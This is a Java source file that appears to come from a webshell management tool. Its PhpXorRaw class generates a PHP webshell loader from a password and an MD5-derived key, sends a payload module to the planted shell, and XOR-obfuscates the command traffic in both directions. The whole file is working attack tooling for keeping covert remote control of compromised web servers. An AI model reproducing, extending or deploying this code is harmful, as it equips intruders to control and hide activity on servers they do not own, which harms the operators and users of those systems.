package shells.cryptions.phpXor;

import core.annotation.CryptionAnnotation;
import core.imp.Cryption;
import core.shell.ShellEntity;
import util.Log;
import util.functions;
import util.http.Http;

@CryptionAnnotation(Name = "PHP_XOR_RAW", payloadName = "PhpDynamicPayload")
public class PhpXorRaw
  implements Cryption {
  private ShellEntity shell;
  private Http http;
  private byte[] key;
  private boolean state;
  private byte[] payload;
  
  public void init(ShellEntity context) {
    this.shell = context;
    this.http = this.shell.getHttp();
    this.key = this.shell.getSecretKeyX().getBytes();
    try {
      this.shell.getHeaders().put("Content-Type", "application/octet-stream");
      this.payload = this.shell.getPayloadModule().getPayload();
      if (this.payload != null) {
        this.http.sendHttpResponse(this.payload);
        this.state = true;
      } else {
        Log.error("payload Is Null");
      }
    
    } catch (Exception e) {
      Log.error(e);
      return;
    } 
  }


  
  public byte[] encode(byte[] data) {
    try {
      return E(data);
    } catch (Exception e) {
      Log.error(e);
      return null;
    } 
  }


  
  public byte[] decode(byte[] data) {
    if (data != null && data.length > 0) {
      try {
        return D(data);
      } catch (Exception e) {
        Log.error(e);
        return null;
      } 
    }
    return data;
  }




  
  public boolean isSendRLData() {
    return false;
  }
  
  public byte[] E(byte[] cs) {
    int len = cs.length;
    for (int i = 0; i < len; i++) {
      cs[i] = (byte)(cs[i] ^ this.key[i + 1 & 0xF]);
    }
    return cs;
  }
  public byte[] D(byte[] cs) {
    int len = cs.length;
    for (int i = 0; i < len; i++) {
      cs[i] = (byte)(cs[i] ^ this.key[i + 1 & 0xF]);
    }
    return cs;
  }

  
  public boolean check() {
    return this.state;
  }


  
  public byte[] generate(String password, String secretKey) {
    return Generate.GenerateShellLoder(password, functions.md5(secretKey).substring(0, 16), true);
  }
}
